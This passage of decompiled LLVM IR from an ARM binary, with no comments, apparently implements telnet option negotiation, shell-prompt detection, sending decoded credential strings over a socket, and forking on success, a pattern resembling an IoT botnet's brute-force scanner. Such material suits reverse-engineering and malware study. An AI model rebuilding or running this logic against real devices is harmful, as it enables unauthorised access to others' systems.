  %v3_10dc8 = load i32, i32* %v2_10dc8, align 4
  store i32 %v3_10dc8, i32* %ip.global-to-local, align 4
  store i32 9, i32* %r2.global-to-local, align 4
  %v2_10dd0 = add i32 %v0_10dc8, 12
  %v3_10dd0 = inttoptr i32 %v2_10dd0 to i32*
  store i32 9, i32* %v3_10dd0, align 4
  br label %dec_label_pc_10d00

dec_label_pc_10dd8:                               ; preds = %dec_label_pc_10844
  %v1_10dd8 = add i32 %v0_10844, 24
  %v2_10dd8 = inttoptr i32 %v1_10dd8 to i32*
  %v3_10dd8 = load i32, i32* %v2_10dd8, align 4
  store i32 %v3_10dd8, i32* %ip.global-to-local, align 4
  %v1_10ddc = add i32 %v3_10dd8, -1
  store i32 %v1_10ddc, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_10de0 = icmp eq i32 %v1_10ddc, 0
  store i1 %v2_10de0, i1* %cpsr_z.global-to-local, align 1
  %v5_10de4 = icmp sgt i32 %v1_10ddc, 0
  br i1 %v5_10de4, label %dec_label_pc_10e0c, label %dec_label_pc_107c8.backedge.thread

dec_label_pc_10dec:                               ; preds = %bb365
  %v2_10dec = icmp ugt i8 %v3_10e10, 35
  store i1 %v2_10dec, i1* %cpsr_c.global-to-local, align 1
  %v7_10dec = icmp eq i8 %v3_10e10, 36
  store i1 %v7_10dec, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10dec, label %dec_label_pc_10e20, label %dec_label_pc_10df4

dec_label_pc_10df4:                               ; preds = %dec_label_pc_10dec
  %v2_10df4 = icmp ugt i8 %v3_10e10, 34
  store i1 %v2_10df4, i1* %cpsr_c.global-to-local, align 1
  %v7_10df4 = icmp eq i8 %v3_10e10, 35
  store i1 %v7_10df4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10df4, label %dec_label_pc_10e20, label %dec_label_pc_10dfc

dec_label_pc_10dfc:                               ; preds = %dec_label_pc_10df4
  %v2_10dfc = icmp ugt i8 %v3_10e10, 36
  store i1 %v2_10dfc, i1* %cpsr_c.global-to-local, align 1
  %v7_10dfc = icmp eq i8 %v3_10e10, 37
  store i1 %v7_10dfc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10dfc, label %dec_label_pc_10e20, label %dec_label_pc_10e04

dec_label_pc_10e04:                               ; preds = %dec_label_pc_10dfc
  %v1_10e04 = add i32 %v0_10e20, -1
  store i32 %v1_10e04, i32* %r0.global-to-local, align 4
  %v2_10e04 = icmp ne i32 %v0_10e20, 0
  store i1 %v2_10e04, i1* %cpsr_c.global-to-local, align 1
  %v7_10e04 = icmp eq i32 %v0_10e20, 1
  store i1 %v7_10e04, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10e04, label %dec_label_pc_107c8.backedge.thread501, label %dec_label_pc_10e0c

dec_label_pc_10e0c:                               ; preds = %dec_label_pc_10dd8, %dec_label_pc_10e04
  %v0_10e20 = phi i32 [ %v1_10e04, %dec_label_pc_10e04 ], [ %v1_10ddc, %dec_label_pc_10dd8 ]
  %v2_10e0c = add i32 %v0_10e20, %v0_10844
  store i32 %v2_10e0c, i32* %r3.global-to-local, align 4
  %v1_10e10 = add i32 %v2_10e0c, 28
  %v2_10e10 = inttoptr i32 %v1_10e10 to i8*
  %v3_10e10 = load i8, i8* %v2_10e10, align 1
  %v4_10e10 = zext i8 %v3_10e10 to i32
  store i32 %v4_10e10, i32* %r3.global-to-local, align 4
  %v2_10e14 = icmp ugt i8 %v3_10e10, 61
  store i1 %v2_10e14, i1* %cpsr_c.global-to-local, align 1
  %v7_10e14 = icmp eq i8 %v3_10e10, 62
  store i1 %v7_10e14, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10e14, label %dec_label_pc_10e20, label %bb365

bb365:                                            ; preds = %dec_label_pc_10e0c
  %v3_10e18 = icmp ugt i8 %v3_10e10, 57
  store i1 %v3_10e18, i1* %cpsr_c.global-to-local, align 1
  %v8_10e18 = icmp eq i8 %v3_10e10, 58
  store i1 %v8_10e18, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_10e18, label %dec_label_pc_10e20, label %dec_label_pc_10dec

dec_label_pc_10e20:                               ; preds = %dec_label_pc_10e0c, %bb365, %dec_label_pc_10dfc, %dec_label_pc_10df4, %dec_label_pc_10dec
  %v1_10e20 = add i32 %v0_10e20, 1
  store i32 %v1_10e20, i32* @r7, align 4
  %v2_10e24 = icmp eq i32 %v1_10e20, -1
  store i1 %v2_10e24, i1* %cpsr_c.global-to-local, align 1
  %v7_10e24 = icmp eq i32 %v0_10e20, -2
  store i1 %v7_10e24, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10e24, label %dec_label_pc_107c8.backedge.thread501, label %dec_label_pc_10e2c

dec_label_pc_10e2c:                               ; preds = %dec_label_pc_10e20
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_10e2c = icmp eq i32 %v1_10e20, 0
  store i1 %v2_10e2c, i1* %cpsr_z.global-to-local, align 1
  %tmp366 = icmp slt i32 %v1_10e20, 1
  br i1 %tmp366, label %dec_label_pc_10950, label %dec_label_pc_10e34

dec_label_pc_10e34:                               ; preds = %dec_label_pc_10e2c
  store i32 8, i32* %r0.global-to-local, align 4
  %v1_10e38 = call i32 @function_1134c(i32 8)
  store i32 %v2_10738, i32* %r1.global-to-local, align 4
  store i32 8, i32* %r0.global-to-local, align 4
  %v3_10e48 = call i32 @function_11268(i32 8, i32* nonnull %stack_var_-56)
  store i32 %v3_10e48, i32* %r0.global-to-local, align 4
  %v3_10e4c = load i32, i32* %stack_var_-56, align 4
  store i32 %v3_10e4c, i32* %r2.global-to-local, align 4
  store i32 %v3_10e48, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_10e58 = load i32, i32* @r6, align 4
  %v1_10e58 = add i32 %v0_10e58, 4
  %v2_10e58 = inttoptr i32 %v1_10e58 to i32*
  %v3_10e58 = load i32, i32* %v2_10e58, align 4
  store i32 %v3_10e58, i32* %r0.global-to-local, align 4
  %v4_10e5c = inttoptr i32 %v3_10e48 to i32*
  %v5_10e5c = call i32 @send(i32 %v3_10e58, i32* %v4_10e5c, i32 %v3_10e4c, i32 16384)
  store i32 %v5_10e5c, i32* %r0.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_120c8.257 to i32), i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_10e6c = load i32, i32* @r6, align 4
  %v1_10e6c = add i32 %v0_10e6c, 4
  %v2_10e6c = inttoptr i32 %v1_10e6c to i32*
  %v3_10e6c = load i32, i32* %v2_10e6c, align 4
  store i32 %v3_10e6c, i32* %r0.global-to-local, align 4
  %v5_10e70 = call i32 @send(i32 %v3_10e6c, i32* bitcast ([3 x i8]* @global_var_120c8.257 to i32*), i32 2, i32 16384)
  store i32 8, i32* %r0.global-to-local, align 4
  %v1_10e78 = call i32 @function_11294(i32 8)
  store i32 %v1_10e78, i32* %r0.global-to-local, align 4
  %v0_10e7c = load i32, i32* @r6, align 4
  %v1_10e7c = add i32 %v0_10e7c, 24
  %v2_10e7c = inttoptr i32 %v1_10e7c to i32*
  %v3_10e7c = load i32, i32* %v2_10e7c, align 4
  store i32 %v3_10e7c, i32* %ip.global-to-local, align 4
  store i32 10, i32* %r2.global-to-local, align 4
  %v2_10e84 = add i32 %v0_10e7c, 12
  %v3_10e84 = inttoptr i32 %v2_10e84 to i32*
  store i32 10, i32* %v3_10e84, align 4
  br label %dec_label_pc_10d00

dec_label_pc_10e8c:                               ; preds = %dec_label_pc_10844
  %v1_10e8c = add i32 %v0_10844, 24
  %v2_10e8c = inttoptr i32 %v1_10e8c to i32*
  %v3_10e8c = load i32, i32* %v2_10e8c, align 4
  store i32 %v3_10e8c, i32* %ip.global-to-local, align 4
  %v1_10e90 = add i32 %v3_10e8c, -1
  store i32 %v1_10e90, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_10e94 = icmp eq i32 %v1_10e90, 0
  store i1 %v2_10e94, i1* %cpsr_z.global-to-local, align 1
  %v5_10e98 = icmp sgt i32 %v1_10e90, 0
  br i1 %v5_10e98, label %dec_label_pc_10ec0, label %dec_label_pc_107c8.backedge.thread

dec_label_pc_10ea0:                               ; preds = %bb367
  %v2_10ea0 = icmp ugt i8 %v3_10ec4, 35
  store i1 %v2_10ea0, i1* %cpsr_c.global-to-local, align 1
  %v7_10ea0 = icmp eq i8 %v3_10ec4, 36
  store i1 %v7_10ea0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10ea0, label %dec_label_pc_10ed4, label %dec_label_pc_10ea8

dec_label_pc_10ea8:                               ; preds = %dec_label_pc_10ea0
  %v2_10ea8 = icmp ugt i8 %v3_10ec4, 34
  store i1 %v2_10ea8, i1* %cpsr_c.global-to-local, align 1
  %v7_10ea8 = icmp eq i8 %v3_10ec4, 35
  store i1 %v7_10ea8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10ea8, label %dec_label_pc_10ed4, label %dec_label_pc_10eb0

dec_label_pc_10eb0:                               ; preds = %dec_label_pc_10ea8
  %v2_10eb0 = icmp ugt i8 %v3_10ec4, 36
  store i1 %v2_10eb0, i1* %cpsr_c.global-to-local, align 1
  %v7_10eb0 = icmp eq i8 %v3_10ec4, 37
  store i1 %v7_10eb0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10eb0, label %dec_label_pc_10ed4, label %dec_label_pc_10eb8

dec_label_pc_10eb8:                               ; preds = %dec_label_pc_10eb0
  %v1_10eb8 = add i32 %v0_10ed4, -1
  store i32 %v1_10eb8, i32* %r0.global-to-local, align 4
  %v2_10eb8 = icmp ne i32 %v0_10ed4, 0
  store i1 %v2_10eb8, i1* %cpsr_c.global-to-local, align 1
  %v7_10eb8 = icmp eq i32 %v0_10ed4, 1
  store i1 %v7_10eb8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10eb8, label %dec_label_pc_107c8.backedge.thread501, label %dec_label_pc_10ec0

dec_label_pc_10ec0:                               ; preds = %dec_label_pc_10e8c, %dec_label_pc_10eb8
  %v0_10ed4 = phi i32 [ %v1_10eb8, %dec_label_pc_10eb8 ], [ %v1_10e90, %dec_label_pc_10e8c ]
  %v2_10ec0 = add i32 %v0_10ed4, %v0_10844
  store i32 %v2_10ec0, i32* %r3.global-to-local, align 4
  %v1_10ec4 = add i32 %v2_10ec0, 28
  %v2_10ec4 = inttoptr i32 %v1_10ec4 to i8*
  %v3_10ec4 = load i8, i8* %v2_10ec4, align 1
  %v4_10ec4 = zext i8 %v3_10ec4 to i32
  store i32 %v4_10ec4, i32* %r3.global-to-local, align 4
  %v2_10ec8 = icmp ugt i8 %v3_10ec4, 61
  store i1 %v2_10ec8, i1* %cpsr_c.global-to-local, align 1
  %v7_10ec8 = icmp eq i8 %v3_10ec4, 62
  store i1 %v7_10ec8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10ec8, label %dec_label_pc_10ed4, label %bb367

bb367:                                            ; preds = %dec_label_pc_10ec0
  %v3_10ecc = icmp ugt i8 %v3_10ec4, 57
  store i1 %v3_10ecc, i1* %cpsr_c.global-to-local, align 1
  %v8_10ecc = icmp eq i8 %v3_10ec4, 58
  store i1 %v8_10ecc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_10ecc, label %dec_label_pc_10ed4, label %dec_label_pc_10ea0

dec_label_pc_10ed4:                               ; preds = %dec_label_pc_10ec0, %bb367, %dec_label_pc_10eb0, %dec_label_pc_10ea8, %dec_label_pc_10ea0
  %v1_10ed4 = add i32 %v0_10ed4, 1
  store i32 %v1_10ed4, i32* @r7, align 4
  %v2_10ed8 = icmp eq i32 %v1_10ed4, -1
  store i1 %v2_10ed8, i1* %cpsr_c.global-to-local, align 1
  %v7_10ed8 = icmp eq i32 %v0_10ed4, -2
  store i1 %v7_10ed8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10ed8, label %dec_label_pc_107c8.backedge.thread501, label %dec_label_pc_10ee0

dec_label_pc_10ee0:                               ; preds = %dec_label_pc_10ed4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_10ee0 = icmp eq i32 %v1_10ed4, 0
  store i1 %v2_10ee0, i1* %cpsr_z.global-to-local, align 1
  %tmp368 = icmp slt i32 %v1_10ed4, 1
  br i1 %tmp368, label %dec_label_pc_10950, label %dec_label_pc_10ee8

dec_label_pc_10ee8:                               ; preds = %dec_label_pc_10ee0
  store i32 4, i32* %r0.global-to-local, align 4
  %v1_10eec = call i32 @function_1134c(i32 4)
  store i32 %v2_10c30, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r0.global-to-local, align 4
  %v3_10efc = call i32 @function_11268(i32 4, i32* nonnull %stack_var_-48)
  store i32 %v3_10efc, i32* %r0.global-to-local, align 4
  %v3_10f00 = load i32, i32* %stack_var_-48, align 4
  store i32 %v3_10f00, i32* %r2.global-to-local, align 4
  store i32 %v3_10efc, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_10f0c = load i32, i32* @r6, align 4
  %v1_10f0c = add i32 %v0_10f0c, 4
  %v2_10f0c = inttoptr i32 %v1_10f0c to i32*
  %v3_10f0c = load i32, i32* %v2_10f0c, align 4
  store i32 %v3_10f0c, i32* %r0.global-to-local, align 4
  %v4_10f10 = inttoptr i32 %v3_10efc to i32*
  %v5_10f10 = call i32 @send(i32 %v3_10f0c, i32* %v4_10f10, i32 %v3_10f00, i32 16384)
  store i32 %v5_10f10, i32* %r0.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_120c8.257 to i32), i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_10f20 = load i32, i32* @r6, align 4
  %v1_10f20 = add i32 %v0_10f20, 4
  %v2_10f20 = inttoptr i32 %v1_10f20 to i32*
  %v3_10f20 = load i32, i32* %v2_10f20, align 4
  store i32 %v3_10f20, i32* %r0.global-to-local, align 4
  %v5_10f24 = call i32 @send(i32 %v3_10f20, i32* bitcast ([3 x i8]* @global_var_120c8.257 to i32*), i32 2, i32 16384)
  store i32 4, i32* %r0.global-to-local, align 4
  %v1_10f2c = call i32 @function_11294(i32 4)
  store i32 %v1_10f2c, i32* %r0.global-to-local, align 4
  %v0_10f30 = load i32, i32* @r6, align 4
  %v1_10f30 = add i32 %v0_10f30, 24
  %v2_10f30 = inttoptr i32 %v1_10f30 to i32*
  %v3_10f30 = load i32, i32* %v2_10f30, align 4
  store i32 %v3_10f30, i32* %ip.global-to-local, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  %v2_10f38 = add i32 %v0_10f30, 12
  %v3_10f38 = inttoptr i32 %v2_10f38 to i32*
  store i32 8, i32* %v3_10f38, align 4
  br label %dec_label_pc_10d00

dec_label_pc_10f40:                               ; preds = %dec_label_pc_108c8
  store i32 ptrtoint (i32* @global_var_120da.259 to i32), i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  store i32 %v2_10f4c, i32* %r0.global-to-local, align 4
  %v5_10f50 = call i32* @memcpy(i32* nonnull %stack_var_-41, i32* nonnull @global_var_120da.259, i32 3)
  store i32 9, i32* %r2.global-to-local, align 4
  store i32 %v2_10f5c, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_120d1.261 to i32), i32* %r1.global-to-local, align 4
  %v5_10f64 = call i32* @memcpy(i32* nonnull %stack_var_-73, i32* nonnull @global_var_120d1.261, i32 9)
  %v7_10f64 = ptrtoint i32* %v5_10f64 to i32
  store i32 %v7_10f64, i32* %r0.global-to-local, align 4
  %v0_10f68 = load i32, i32* @r6, align 4
  %v1_10f68 = add i32 %v0_10f68, 24
  %v2_10f68 = inttoptr i32 %v1_10f68 to i32*
  %v3_10f68 = load i32, i32* %v2_10f68, align 4
  store i32 %v3_10f68, i32* %ip.global-to-local, align 4
  %v0_10f6c = load i32, i32* @r5, align 4
  %v1_10f6c = add i32 %v0_10f6c, 2
  store i32 %v1_10f6c, i32* %r2.global-to-local, align 4
  %v0_10f70 = load i32, i32* %r8.global-to-local, align 4
  %v2_10f70 = add i32 %v0_10f70, %v3_10f68
  store i32 %v2_10f70, i32* %r3.global-to-local, align 4
  %v3_10f74 = icmp uge i32 %v2_10f70, %v1_10f6c
  store i1 %v3_10f74, i1* %cpsr_c.global-to-local, align 1
  %v9_10f74 = icmp eq i32 %v2_10f70, %v1_10f6c
  store i1 %v9_10f74, i1* %cpsr_z.global-to-local, align 1
  %v2_10f78 = xor i1 %v3_10f74, true
  %v3_10f78 = or i1 %v9_10f74, %v2_10f78
  br i1 %v3_10f78, label %dec_label_pc_10f40.dec_label_pc_10940.loopexit_crit_edge, label %dec_label_pc_10f7c

dec_label_pc_10f40.dec_label_pc_10940.loopexit_crit_edge: ; preds = %dec_label_pc_10f40
  %v0_10940.pre.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_10940

dec_label_pc_10f7c:                               ; preds = %dec_label_pc_10f40
  %v0_10f7c = load i32, i32* @r4, align 4
  %v1_10f7c = add i32 %v0_10f7c, 1
  %v2_10f7c = inttoptr i32 %v1_10f7c to i8*
  %v3_10f7c = load i8, i8* %v2_10f7c, align 1
  %v4_10f7c = zext i8 %v3_10f7c to i32
  store i32 %v4_10f7c, i32* %r3.global-to-local, align 4
  %v2_10f80 = icmp ugt i8 %v3_10f7c, 30
  store i1 %v2_10f80, i1* %cpsr_c.global-to-local, align 1
  %v7_10f80 = icmp eq i8 %v3_10f7c, 31
  store i1 %v7_10f80, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10f80, label %dec_label_pc_1110c, label %dec_label_pc_10f88

dec_label_pc_10f88:                               ; preds = %dec_label_pc_10f7c
  %v1_10f88 = add i32 %v0_10f7c, -1
  %v2_10f88 = inttoptr i32 %v1_10f88 to i8*
  %v3_10f88 = load i8, i8* %v2_10f88, align 1
  %v4_10f88 = zext i8 %v3_10f88 to i32
  store i32 %v4_10f88, i32* %r3.global-to-local, align 4
  %v2_10f8c = icmp ugt i8 %v3_10f88, -4
  store i1 %v2_10f8c, i1* %cpsr_c.global-to-local, align 1
  %v7_10f8c = icmp eq i8 %v3_10f88, -3
  store i1 %v7_10f8c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10f8c, label %bb369, label %dec_label_pc_10f98

bb369:                                            ; preds = %dec_label_pc_10f88
  %v1_10f90 = load i32, i32* %sl.global-to-local, align 4
  %v2_10f90 = trunc i32 %v1_10f90 to i8
  store i8 %v2_10f90, i8* %v2_10f88, align 1
  %v0_10f94.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_10f94.pr, label %dec_label_pc_108dc, label %.dec_label_pc_10f98_crit_edge

.dec_label_pc_10f98_crit_edge:                    ; preds = %bb369
  %v0_10f98.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10f98

dec_label_pc_10f98:                               ; preds = %.dec_label_pc_10f98_crit_edge, %dec_label_pc_10f88
  %v0_10f98 = phi i32 [ %v0_10f98.pre, %.dec_label_pc_10f98_crit_edge ], [ %v4_10f88, %dec_label_pc_10f88 ]
  %v2_10f98 = icmp ugt i32 %v0_10f98, 250
  store i1 %v2_10f98, i1* %cpsr_c.global-to-local, align 1
  %v7_10f98 = icmp eq i32 %v0_10f98, 251
  store i1 %v7_10f98, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10f98, label %bb370, label %dec_label_pc_108dc

bb370:                                            ; preds = %dec_label_pc_10f98
  store i32 -3, i32* %r2.global-to-local, align 4
  %v3_10fa0 = load i32, i32* @r4, align 4
  %v4_10fa0 = add i32 %v3_10fa0, -1
  %v5_10fa0 = inttoptr i32 %v4_10fa0 to i8*
  store i8 -3, i8* %v5_10fa0, align 1
  br label %dec_label_pc_108dc

dec_label_pc_10fa8:                               ; preds = %dec_label_pc_10a2c, %dec_label_pc_10a08, %dec_label_pc_10a48
  store i32 25, i32* %r0.global-to-local, align 4
  %v1_10fac = call i32 @function_1134c(i32 25)
  store i32 %v2_10738, i32* %r1.global-to-local, align 4
  store i32 25, i32* %r0.global-to-local, align 4
  %v3_10fbc = call i32 @function_11268(i32 25, i32* nonnull %stack_var_-56)
  %v3_10fc0 = load i32, i32* %stack_var_-56, align 4
  store i32 %v3_10fbc, i32* %r2.global-to-local, align 4
  %v1_10fc8 = add i32 %v3_10fc0, -1
  store i32 %v1_10fc8, i32* %r3.global-to-local, align 4
  %v0_10fcc = load i32, i32* %r8.global-to-local, align 4
  store i32 %v0_10fcc, i32* %r0.global-to-local, align 4
  %v0_10fd0 = load i32, i32* @r6, align 4
  %v1_10fd0 = add i32 %v0_10fd0, 24
  %v2_10fd0 = inttoptr i32 %v1_10fd0 to i32*
  %v3_10fd0 = load i32, i32* %v2_10fd0, align 4
  store i32 %v3_10fd0, i32* %r1.global-to-local, align 4
  %v4_10fd4 = call i32 @function_1185c(i32 %v0_10fcc, i32 %v3_10fd0, i32 %v3_10fbc, i32 %v1_10fc8)
  store i32 %v4_10fd4, i32* %r0.global-to-local, align 4
  %v1_10fd8 = add i32 %v4_10fd4, 1
  store i32 %v1_10fd8, i32* @r7, align 4
  %v2_10fd8 = icmp eq i32 %v4_10fd4, -1
  store i1 %v2_10fd8, i1* %cpsr_c.global-to-local, align 1
  %v7_10fd8 = icmp eq i32 %v1_10fd8, 0
  store i1 %v7_10fd8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10fd8, label %thread-pre-split100, label %bb371

bb371:                                            ; preds = %dec_label_pc_10fa8
  store i32 1, i32* @r7, align 4
  br label %thread-pre-split100

thread-pre-split100:                              ; preds = %dec_label_pc_10fa8, %bb371
  %v0_10fe0 = phi i1 [ false, %bb371 ], [ true, %dec_label_pc_10fa8 ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 %v0_10fe0, i1* %cpsr_z.global-to-local, align 1
  store i32 25, i32* %r0.global-to-local, align 4
  %v1_11174 = call i32 @function_11294(i32 25)
  store i32 %v1_11174, i32* %r0.global-to-local, align 4
  br i1 %v0_10fe0, label %dec_label_pc_11170, label %dec_label_pc_10fe8

dec_label_pc_10fe8:                               ; preds = %thread-pre-split100
  %v0_10ff0 = load i32, i32* @r7, align 4
  %v3_10ff0 = icmp eq i32 %v0_10ff0, -1
  store i1 %v3_10ff0, i1* %cpsr_c.global-to-local, align 1
  store i1 %v3_10ff0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_10ff0, label %dec_label_pc_107c4.loopexit, label %dec_label_pc_10a5c

dec_label_pc_10ffc:                               ; preds = %dec_label_pc_10c7c
  store i32 9, i32* %r0.global-to-local, align 4
  %v1_11008 = call i32 @function_1134c(i32 9)
  store i32 %v2_10738, i32* %r1.global-to-local, align 4
  store i32 9, i32* %r0.global-to-local, align 4
  %v3_11018 = call i32 @function_11268(i32 9, i32* nonnull %stack_var_-56)
  store i32 %v3_11018, i32* %r0.global-to-local, align 4
  %v3_1101c = load i32, i32* %stack_var_-56, align 4
  store i32 %v3_11018, i32* %r2.global-to-local, align 4
  %v1_11024 = add i32 %v3_1101c, -1
  store i32 %v1_11024, i32* %r3.global-to-local, align 4
  %v0_11028 = load i32, i32* @r6, align 4
  %v1_11028 = add i32 %v0_11028, 24
  %v2_11028 = inttoptr i32 %v1_11028 to i32*
  %v3_11028 = load i32, i32* %v2_11028, align 4
  store i32 %v3_11028, i32* %r1.global-to-local, align 4
  %v0_1102c = load i32, i32* %r8.global-to-local, align 4
  store i32 %v0_1102c, i32* %r0.global-to-local, align 4
  %v4_11030 = call i32 @function_1185c(i32 %v0_1102c, i32 %v3_11028, i32 %v3_11018, i32 %v1_11024)
  store i32 %v4_11030, i32* @r7, align 4
  store i32 9, i32* %r0.global-to-local, align 4
  %v1_1103c = call i32 @function_11294(i32 9)
  store i32 %v1_1103c, i32* %r0.global-to-local, align 4
  %v0_11040 = load i32, i32* @r7, align 4
  %v2_11040 = icmp eq i32 %v0_11040, -1
  store i1 %v2_11040, i1* %cpsr_c.global-to-local, align 1
  store i1 %v2_11040, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_11040, label %dec_label_pc_107c4.loopexit, label %dec_label_pc_11048

dec_label_pc_11048:                               ; preds = %dec_label_pc_10ffc
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_11048 = icmp eq i32 %v0_11040, 0
  store i1 %v2_11048, i1* %cpsr_z.global-to-local, align 1
  %tmp372 = icmp slt i32 %v0_11040, 1
  br i1 %tmp372, label %dec_label_pc_10950, label %dec_label_pc_11050

dec_label_pc_11050:                               ; preds = %dec_label_pc_11048
  %v0_11050 = load i32, i32* @r6, align 4
  %v1_11050 = add i32 %v0_11050, 21
  %v2_11050 = inttoptr i32 %v1_11050 to i8*
  %v3_11050 = load i8, i8* %v2_11050, align 1
  %v4_11050 = zext i8 %v3_11050 to i32
  store i32 %v4_11050, i32* %r3.global-to-local, align 4
  %v1_11054 = add i32 %v0_11050, 20
  %v2_11054 = inttoptr i32 %v1_11054 to i8*
  %v3_11054 = load i8, i8* %v2_11054, align 1
  %v4_11054 = zext i8 %v3_11054 to i32
  store i32 %v4_11054, i32* %r2.global-to-local, align 4
  %v1_11058 = add i32 %v0_11050, 16
  %v2_11058 = inttoptr i32 %v1_11058 to i32*
  %v3_11058 = load i32, i32* %v2_11058, align 4
  store i32 %v3_11058, i32* %r1.global-to-local, align 4
  %v4_1105c = mul nuw nsw i32 %v4_11050, 256
  %v5_1105c = or i32 %v4_11054, %v4_1105c
  store i32 %v5_1105c, i32* %r2.global-to-local, align 4
  %v1_11060 = and i32 %v4_11054, 128
  %v2_11060 = icmp ne i32 %v1_11060, 0
  store i1 %v2_11060, i1* %cpsr_c.global-to-local, align 1
  store i32 %v4_11050, i32* %r3.global-to-local, align 4
  store i32 %v3_11058, i32* %stack_var_-48, align 4
  store i32 %v5_1105c, i32* %stack_var_-38, align 4
  %v1_11070 = inttoptr i32 %v0_11050 to i32*
  %v2_11070 = load i32, i32* %v1_11070, align 4
  store i32 %v2_11070, i32* %sl.global-to-local, align 4
  %v0_11074 = call i32 @fork()
  store i32 %v0_11074, i32* %r0.global-to-local, align 4
  %v2_11078 = icmp eq i32 %v0_11074, -1
  %.385 = zext i1 %v2_11078 to i32
  store i32 %.385, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_11084 = icmp eq i32 %v0_11074, 0
  store i1 %v2_11084, i1* %cpsr_z.global-to-local, align 1
  %tmp375 = icmp slt i32 %v0_11074, 1
  br i1 %tmp375, label %bb376, label %.thread103

.thread103:                                       ; preds = %dec_label_pc_11050
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_11098

bb376:                                            ; preds = %dec_label_pc_11050
  store i32 %.385, i32* @r5, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_11090 = icmp eq i1 %v2_11078, false
  store i1 %v2_11090, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_11090, label %dec_label_pc_111d8, label %dec_label_pc_11098

dec_label_pc_11098:                               ; preds = %.thread103, %bb376
  %v0_11098 = load i32, i32* @r6, align 4
  %v1_11098 = add i32 %v0_11098, 4
  %v2_11098 = inttoptr i32 %v1_11098 to i32*
  %v3_11098 = load i32, i32* %v2_11098, align 4
  store i32 %v3_11098, i32* %r0.global-to-local, align 4
  %v1_1109c = call i32 @close(i32 %v3_11098)
  store i32 %v1_1109c, i32* %r0.global-to-local, align 4
  %v0_110a0 = load i32, i32* @r6, align 4
  %v1_110a0 = add i32 %v0_110a0, 24
  %v2_110a0 = inttoptr i32 %v1_110a0 to i32*
  %v3_110a0 = load i32, i32* %v2_110a0, align 4
  store i32 %v3_110a0, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v0_110a8 = load i32, i32* @r4, align 4
  %v2_110a8 = add i32 %v0_110a0, 4
  %v3_110a8 = inttoptr i32 %v2_110a8 to i32*
  store i32 %v0_110a8, i32* %v3_110a8, align 4
  %v0_110ac = load i32, i32* %r2.global-to-local, align 4
  %v1_110ac = load i32, i32* @r6, align 4
  %v2_110ac = add i32 %v1_110ac, 12
  %v3_110ac = inttoptr i32 %v2_110ac to i32*
  store i32 %v0_110ac, i32* %v3_110ac, align 4
  br label %dec_label_pc_10d00

dec_label_pc_110b4:                               ; preds = %dec_label_pc_107e0
  br i1 %v2_10804, label %dec_label_pc_11180, label %dec_label_pc_110b8

dec_label_pc_110b8:                               ; preds = %dec_label_pc_110b4
  %v3_110b8 = icmp eq i32 %v5_10800, -1
  store i1 %v3_110b8, i1* %cpsr_c.global-to-local, align 1
  store i1 %v3_110b8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_110b8, label %dec_label_pc_110c0, label %dec_label_pc_1082c

dec_label_pc_110c0:                               ; preds = %dec_label_pc_110b8
  %v0_110c0 = load i32, i32* @sb, align 4
  %v1_110c0 = inttoptr i32 %v0_110c0 to i32*
  %v2_110c0 = load i32, i32* %v1_110c0, align 4
  store i32 %v2_110c0, i32* %r3.global-to-local, align 4
  %v2_110c4 = icmp ugt i32 %v2_110c0, 10
  store i1 %v2_110c4, i1* %cpsr_c.global-to-local, align 1
  %v7_110c4 = icmp eq i32 %v2_110c0, 11
  store i1 %v7_110c4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_110c4, label %dec_label_pc_105fc, label %dec_label_pc_110cc

